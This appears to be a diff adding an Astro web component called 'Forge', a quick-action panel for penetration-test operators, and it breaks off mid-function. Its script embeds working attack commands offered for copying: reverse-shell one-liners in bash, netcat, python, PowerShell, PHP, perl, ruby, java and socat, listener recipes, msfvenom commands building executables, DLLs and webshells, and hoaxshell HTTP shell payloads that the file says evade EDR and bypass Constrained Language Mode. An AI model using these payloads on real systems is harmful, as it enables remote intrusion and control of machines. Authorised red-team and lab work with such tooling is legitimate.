@@ -1,0 +1,1433 @@
+---
+// src/components/Forge.astro
+//
+// Floating-button "Forge" — quick-action toolkit for operators.
+// Sits to the left of OperatorConsole (which sits left of PaletteTuner).
+//
+// Five tabs:
+//   - shells     reverse-shell one-liners (12 variants, dropdown)
+//   - listeners  netcat/socat/pwncat/msfconsole listener recipes (5, dropdown)
+//   - msfvenom   payload generation commands (10, dropdown)
+//   - hoaxshell  HTTP-based windows shell (3 entries, dropdown)
+//   - encode     URL / Base64 / Base64-UTF16LE / Hex / HTML / Unicode / JWT
+//                (flat layout — encoders are interactive, each needs its own
+//                input + output)
+//
+// Layout rationale (revised after operator feedback):
+//   - Vertical list of every command made for too much scrolling. Each tab
+//     now uses a dropdown to pick a variant, shows ONE command full-width.
+//   - Hoaxshell uses the same dropdown pattern for consistency.
+//   - Encode stays flat — its 7 encoders are interactive, dropdown doesn't fit.
+//
+// State source: reads from OperatorConsole's localStorage keys
+//   codex.op.target, codex.op.attacker, codex.op.lport, codex.op.user,
+//   codex.op.domain — so operators who've set values get every Forge entry
+//   pre-substituted automatically.
+//
+// Z-index: 9998 (below OperatorConsole's 9999, below PaletteTuner's 10000) —
+// preserves "hover halo paints over the neighbor to the left" convention.
+---
+
+<div class="codex-forge" id="codex-forge">
+
+  <!-- Floating toggle button -->
+  <button
+    type="button"
+    class="codex-forge__toggle"
+    aria-label="Forge — payloads, listeners, encoders"
+    aria-expanded="false"
+    aria-controls="codex-forge-panel"
+    title="Forge — payloads, listeners, encoders"
+  >
+    <!-- Flame icon — evokes "forge fire" and "execute/payload" simultaneously.
+         Adapted from the Lucide flame glyph. Scales cleanly at 18px display. -->
+    <svg
+      width="18"
+      height="18"
+      viewBox="0 0 24 24"
+      fill="none"
+      stroke="currentColor"
+      stroke-width="1.6"
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      aria-hidden="true"
+    >
+      <path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path>
+    </svg>
+  </button>
+
+  <!-- Panel -->
+  <div
+    class="codex-forge__panel"
+    id="codex-forge-panel"
+    role="dialog"
+    aria-label="Forge"
+    aria-hidden="true"
+  >
+    <!-- Header with title + close -->
+    <div class="codex-forge__header">
+      <span class="codex-forge__title">forge</span>
+      <button type="button" class="codex-forge__close" aria-label="Close forge">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
+        </svg>
+      </button>
+    </div>
+
+    <!-- Tab strip -->
+    <div class="codex-forge__tabs" role="tablist">
+      <button type="button" class="codex-forge__tab codex-forge__tab--active" role="tab" aria-selected="true"  data-forge-tab="shells">shells</button>
+      <button type="button" class="codex-forge__tab"                          role="tab" aria-selected="false" data-forge-tab="listeners">listeners</button>
+      <button type="button" class="codex-forge__tab"                          role="tab" aria-selected="false" data-forge-tab="msfvenom">msfvenom</button>
+      <button type="button" class="codex-forge__tab"                          role="tab" aria-selected="false" data-forge-tab="hoaxshell">hoaxshell</button>
+      <button type="button" class="codex-forge__tab"                          role="tab" aria-selected="false" data-forge-tab="encode">encode</button>
+    </div>
+
+    <!-- Body -->
+    <div class="codex-forge__body">
+
+      <!-- ============== SHELLS / LISTENERS / MSFVENOM / HOAXSHELL ============== -->
+      <div class="codex-forge__pane codex-forge__pane--active" data-forge-pane="shells" role="tabpanel">
+        <div class="codex-forge__pane-body" data-forge-payload-pane="shells"></div>
+      </div>
+
+      <div class="codex-forge__pane" data-forge-pane="listeners" role="tabpanel" hidden>
+        <div class="codex-forge__pane-body" data-forge-payload-pane="listeners"></div>
+      </div>
+
+      <div class="codex-forge__pane" data-forge-pane="msfvenom" role="tabpanel" hidden>
+        <div class="codex-forge__pane-body" data-forge-payload-pane="msfvenom"></div>
+      </div>
+
+      <div class="codex-forge__pane" data-forge-pane="hoaxshell" role="tabpanel" hidden>
+        <p class="codex-forge__pane-lede">
+          HTTP-based Windows shell — evades EDR that hooks process telemetry
+          but ignores web traffic. The entries below are <strong>client
+          payloads</strong> to execute on the target. You also need a matching
+          listener (see footer) — substitute its session ID components into
+          <code>&lt;SID1&gt;</code> / <code>&lt;SID2&gt;</code> /
+          <code>&lt;SID3&gt;</code> before pasting on the target.
+        </p>
+        <div class="codex-forge__pane-body" data-forge-payload-pane="hoaxshell"></div>
+        <p class="codex-forge__pane-foot">
+          Listener: run <a href="https://github.com/t3l3machus/hoaxshell/tree/main/revshells" target="_blank" rel="noopener noreferrer"><code>hoaxshell-listener.py</code></a>
+          with <code>-t cmd-curl</code> / <code>-t ps-iex</code> /
+          <code>-t ps-outfile</code> (add <code>-cm</code> suffix for CLM
+          variants; pass <code>-c cert.pem -k key.pem</code> for https). The
+          listener prints the matching SID at startup — split it on
+          <code>-</code> and substitute the three segments into the payload above.
+        </p>
+      </div>
+
+      <!-- ============== ENCODE (flat — interactive encoders) ============== -->
+      <div class="codex-forge__pane" data-forge-pane="encode" role="tabpanel" hidden>
+
+        <div class="codex-forge__enc" data-forge-encoder="url">
+          <div class="codex-forge__row-head">
+            <span class="codex-forge__label">url</span>
+            <div class="codex-forge__enc-dir">
+              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
+              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
+            </div>
+          </div>
+          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste raw value..."></textarea>
+          <div class="codex-forge__enc-out-row">
+            <div class="codex-forge__enc-out" aria-live="polite"></div>
+            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="codex-forge__enc" data-forge-encoder="base64">
+          <div class="codex-forge__row-head">
+            <span class="codex-forge__label">base64</span>
+            <div class="codex-forge__enc-dir">
+              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
+              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
+            </div>
+          </div>
+          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste raw value..."></textarea>
+          <div class="codex-forge__enc-out-row">
+            <div class="codex-forge__enc-out" aria-live="polite"></div>
+            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="codex-forge__enc" data-forge-encoder="base64-utf16le">
+          <div class="codex-forge__row-head">
+            <span class="codex-forge__label">base64 (powershell)</span>
+            <span class="codex-forge__meta">utf-16le · for -EncodedCommand</span>
+          </div>
+          <textarea class="codex-forge__enc-in" rows="2" placeholder='paste powershell, e.g.  IEX(New-Object Net.WebClient).DownloadString("http://...")'></textarea>
+          <div class="codex-forge__enc-out-row">
+            <div class="codex-forge__enc-out" aria-live="polite"></div>
+            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="codex-forge__enc" data-forge-encoder="hex">
+          <div class="codex-forge__row-head">
+            <span class="codex-forge__label">hex</span>
+            <div class="codex-forge__enc-dir">
+              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
+              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
+            </div>
+          </div>
+          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste raw value or hex string..."></textarea>
+          <div class="codex-forge__enc-out-row">
+            <div class="codex-forge__enc-out" aria-live="polite"></div>
+            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="codex-forge__enc" data-forge-encoder="html">
+          <div class="codex-forge__row-head">
+            <span class="codex-forge__label">html entities</span>
+            <div class="codex-forge__enc-dir">
+              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
+              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
+            </div>
+          </div>
+          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste raw value..."></textarea>
+          <div class="codex-forge__enc-out-row">
+            <div class="codex-forge__enc-out" aria-live="polite"></div>
+            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="codex-forge__enc" data-forge-encoder="unicode">
+          <div class="codex-forge__row-head">
+            <span class="codex-forge__label">unicode \u escapes</span>
+            <div class="codex-forge__enc-dir">
+              <button type="button" class="codex-forge__dir codex-forge__dir--active" data-dir="encode">encode</button>
+              <button type="button" class="codex-forge__dir" data-dir="decode">decode</button>
+            </div>
+          </div>
+          <textarea class="codex-forge__enc-in" rows="2" placeholder='paste raw text or \u0061-style escapes...'></textarea>
+          <div class="codex-forge__enc-out-row">
+            <div class="codex-forge__enc-out" aria-live="polite"></div>
+            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+        </div>
+
+        <div class="codex-forge__enc" data-forge-encoder="jwt">
+          <div class="codex-forge__row-head">
+            <span class="codex-forge__label">jwt decode</span>
+            <span class="codex-forge__meta">read-only · header + payload, no signature verify</span>
+          </div>
+          <textarea class="codex-forge__enc-in" rows="2" placeholder="paste jwt: eyJhbGc...eyJzdWI...sigBytes"></textarea>
+          <div class="codex-forge__enc-out-row">
+            <div class="codex-forge__enc-out" aria-live="polite"></div>
+            <button type="button" class="codex-forge__copy codex-forge__copy--enc" data-forge-enc-copy aria-label="Copy output">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+
+    <!-- Toast -->
+    <div class="codex-forge__toast" role="status" aria-live="polite" aria-atomic="true"></div>
+  </div>
+
+</div>
+
+<script is:inline>
+  (function () {
+    'use strict';
+
+    // Module-level state: tracks the currently open dropdown (if any).
+    // Used by the outside-click handler to know which menu to leave open
+    // when the click target is inside that menu (which is now appended
+    // to document.body and so not a DOM descendant of any dropdown).
+    let openMenu = null;
+    let openDropdown = null;
+
+    // PAYLOAD DATA ─ each entry: { label, meta, cmd }
+    const PAYLOADS = {
+      shells: [
+        { label: 'bash tcp',         meta: 'linux · simplest, no nc required',
+          cmd: 'bash -c "bash -i >& /dev/tcp/<ATTACKER>/<LPORT> 0>&1"' },
+        { label: 'nc traditional',   meta: 'linux · -e flag (rare on modern boxes)',
+          cmd: 'nc -e /bin/sh <ATTACKER> <LPORT>' },
+        { label: 'nc openbsd + fifo', meta: 'linux · works when nc lacks -e',
+          cmd: 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER> <LPORT> >/tmp/f' },
+        { label: 'python (linux)',   meta: 'linux · python3, present on most boxes',
+          cmd: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("<ATTACKER>",<LPORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'' },
+        { label: 'python (windows)', meta: 'windows · python.exe on path required',
+          cmd: 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'<ATTACKER>\',<LPORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call([\'cmd\'])"' },
+        { label: 'powershell iex',   meta: 'windows · most common, EDR-signatured',
+          cmd: 'powershell -nop -c "$client=New-Object Net.Sockets.TCPClient(\'<ATTACKER>\',<LPORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+\'PS \'+(pwd).Path+\'> \';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
+        { label: 'php fsockopen',    meta: 'webshell · works in php LFI/RFI chains',
+          cmd: 'php -r \'$sock=fsockopen("<ATTACKER>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");\'' },
+        { label: 'php exec',         meta: 'webshell · simplest one-liner form',
+          cmd: 'php -r \'exec("/bin/bash -c \'"\'"\'bash -i >& /dev/tcp/<ATTACKER>/<LPORT> 0>&1\'"\'"\'");\'' },
+        { label: 'perl',             meta: "linux · usually present where python isn't",
+          cmd: 'perl -e \'use Socket;$i="<ATTACKER>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
+        { label: 'ruby',             meta: 'linux · rails/jenkins environments',
+          cmd: 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("<ATTACKER>","<LPORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' },
+        { label: 'java',             meta: 'jvm targets · tomcat/jenkins/jboss',
+          cmd: 'Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<ATTACKER>/<LPORT> 0>&1"});' },
+        { label: 'socat (full tty)', meta: 'linux · proper pty, ^C and tab-complete work',
+          cmd: "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER>:<LPORT>" },
+      ],
+      listeners: [
+        { label: 'nc plain',           meta: 'simplest, no line-editing',
+          cmd: 'nc -lvnp <LPORT>' },
+        { label: 'rlwrap + nc',        meta: 'readline + arrow-key history',
+          cmd: 'rlwrap nc -lvnp <LPORT>' },
+        { label: 'socat full-tty',     meta: 'pair with socat client shell',
+          cmd: 'socat -d -d TCP4-LISTEN:<LPORT>,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane' },
+        { label: 'pwncat-cs',          meta: 'auto-upgrades tty, persistence, history',
+          cmd: 'pwncat-cs -lp <LPORT>' },
+        { label: 'msfconsole handler', meta: 'match payload type to your shell',
+          cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <ATTACKER>; set LPORT <LPORT>; run"' },
+      ],
+      msfvenom: [
+        { label: 'windows x64 exe',                     meta: 'reverse_tcp · classic windows payload',
+          cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f exe -o shell.exe' },
+        { label: 'windows x64 exe (meterpreter https)', meta: 'more evasive · staged over TLS',
+          cmd: 'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ATTACKER> LPORT=<LPORT> -f exe -o meter.exe' },
+        { label: 'linux x64 elf',                       meta: 'drop and chmod +x on linux targets',
+          cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f elf -o shell.elf' },
+        { label: 'aspx webshell',                       meta: 'iis upload chain · drop into webroot',
+          cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f aspx -o shell.aspx' },
+        { label: 'jsp webshell',                        meta: 'tomcat · drop in webapps/ROOT/',
+          cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f raw -o shell.jsp' },
+        { label: 'war webshell',                        meta: 'tomcat manager · /manager/html deploy',
+          cmd: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f war -o shell.war' },
+        { label: 'php webshell',                        meta: 'lfi/upload chains · request to trigger',
+          cmd: 'msfvenom -p php/reverse_php LHOST=<ATTACKER> LPORT=<LPORT> -f raw -o shell.php' },
+        { label: 'windows dll',                         meta: 'dll hijack · sideload via writable path',
+          cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f dll -o shell.dll' },
+        { label: 'raw shellcode',                       meta: 'for injection / overflow exploitation',
+          cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<LPORT> -f raw -o shell.bin' },
+        { label: 'matching handler',                    meta: 'windows x64 shell_reverse_tcp · run before payload',
+          cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST <ATTACKER>; set LPORT <LPORT>; run"' },
+      ],
+      hoaxshell: [
+        // Each payload is a CLIENT-SIDE string to paste on the windows target.
+        // Placeholders:
+        //   <ATTACKER>:<LPORT>  → filled from OperatorConsole
+        //   <SID1>-<SID2>-<SID3> → operator substitutes from the listener's
+        //                          printed session ID after starting it
+        //
+        // SID structure: the listener (hoaxshell-listener.py or revshells.com's
+        // downloaded variant) prints one 26-char Authorization header value of
+        // the form "abc12345-def67890-aabbccdd". The three hyphen-separated
+        // segments are used as the URL paths /verify, /get-cmd, /post-result.
+        // Substitute each segment into the matching <SID*> placeholder.
+
+        { label: 'Windows CMD cURL',                meta: 'cmd.exe via cURL · no PowerShell required',
+          cmd: '@echo off&cmd /V:ON /C "SET ip=<ATTACKER>:<LPORT>&&SET sid="Authorization: <SID1>-<SID2>-<SID3>"&&SET protocol=http://&&curl !protocol!!ip!/<SID1> -H !sid! > NUL && for /L %i in (0,0,0) do (curl -s !protocol!!ip!/<SID2> -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/<SID3> -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL' },
+
+        { label: 'Windows CMD cURL https',          meta: 'cmd.exe via cURL · TLS (cert ignored with -k)',
+          cmd: '@echo off&cmd /V:ON /C "SET ip=<ATTACKER>:<LPORT>&&SET sid="Authorization: <SID1>-<SID2>-<SID3>"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/<SID1> -H !sid! > NUL & for /L %i in (0,0,0) do (curl -fs -k !protocol!!ip!/<SID2> -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/<SID3> -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL' },
+
+        { label: 'PowerShell IEX',                  meta: 'IRM + Invoke-Expression · default variant',
+          cmd: '$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'http://\';$v=IRM -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i});if ($c -ne \'None\') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep 0.8}' },
+
+        { label: 'PowerShell IEX https',            meta: 'IEX over TLS · trusts self-signed certs',
+          cmd: 'add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i});if ($c -ne \'None\') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep 0.8}' },
+
+        { label: 'PowerShell IEX Constr Lang Mode', meta: 'IEX · CLM bypass (raw $e+$r body, no UTF-8 join)',
+          cmd: '$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'http://\';$v=IRM -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i});if ($c -ne \'None\') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}' },
+
+        { label: 'PowerShell IEX Constr Lang Mode https', meta: 'IEX · CLM bypass · TLS',
+          cmd: 'add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'https://\';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i});if ($c -ne \'None\') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}' },
+
+        { label: 'PowerShell Outfile',              meta: 'writes commands to .ps1 then executes · bypasses some script blocks',
+          cmd: '$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'http://\';$f="C:\\Users\\$env:USERNAME\\.local\\hack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i});if ($c -eq \'exit\') {del $f;exit} elseif ($c -ne \'None\') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep 0.8}' },
+
+        { label: 'PowerShell Outfile https',        meta: 'outfile · TLS',
+          cmd: 'add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'https://\';$f="C:\\Users\\$env:USERNAME\\.local\\hack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i});if ($c -eq \'exit\') {del $f;exit} elseif ($c -ne \'None\') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join \' \')} sleep 0.8}' },
+
+        { label: 'PowerShell Outfile Constr Lang Mode', meta: 'outfile · CLM bypass',
+          cmd: '$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'http://\';$f="C:\\Users\\$env:USERNAME\\.local\\hack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i}); if ($c -eq \'exit\') {del $f;exit} elseif ($c -ne \'None\') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}' },
+
+        { label: 'PowerShell Outfile Constr Lang Mode https', meta: 'outfile · CLM bypass · TLS',
+          cmd: 'add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s=\'<ATTACKER>:<LPORT>\';$i=\'<SID1>-<SID2>-<SID3>\';$p=\'https://\';$f="C:\\Users\\$env:USERNAME\\.local\\hack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/<SID1> -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/<SID2> -Headers @{"Authorization"=$i}); if ($c -eq \'exit\') {del $f;exit} elseif ($c -ne \'None\') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/<SID3> -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}' },
+      ],
+    };
+
+    // Placeholder substitution from OperatorConsole's localStorage
+    const FIELD_MAP = {
+      '<TARGET>':        'target',
+      '<INTERNAL_HOST>': 'target',
+      '<ATTACKER>':      'attacker',
+      '<ATTACKER_IP>':   'attacker',
+      '<COLLAB>':        'attacker',
+      '<LHOST>':         'attacker',
+      '<LPORT>':         'lport',
+      '<USER>':          'user',
+      '<DOMAIN>':        'domain',
+      // Hoaxshell session ID components. These are NOT stored in
+      // OperatorConsole — they're generated fresh by the running listener
+      // for each session. Map to undefined storage keys so they always
+      // render as dashed-pill placeholders, reminding the operator to
+      // substitute them with values from their listener's printed payload.
+      '<SID1>':          '_sid1',
+      '<SID2>':          '_sid2',
+      '<SID3>':          '_sid3',
+    };
+    const STORAGE_PREFIX = 'codex.op.';
+    const TOKENS = Object.keys(FIELD_MAP).sort(function (a, b) { return b.length - a.length; });
+    const TOKEN_RE = new RegExp(
+      TOKENS.map(function (t) { return t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); }).join('|'),
+      'g'
+    );
+
+    function readState() {
+      const s = { target: '', attacker: '', lport: '', user: '', domain: '' };
+      try {
+        for (const k in s) {
+          const v = localStorage.getItem(STORAGE_PREFIX + k);
+          if (v) s[k] = v;
+        }
+      } catch (e) {}
+      return s;
+    }
+
+    function resolveCmd(template) {
+      const state = readState();
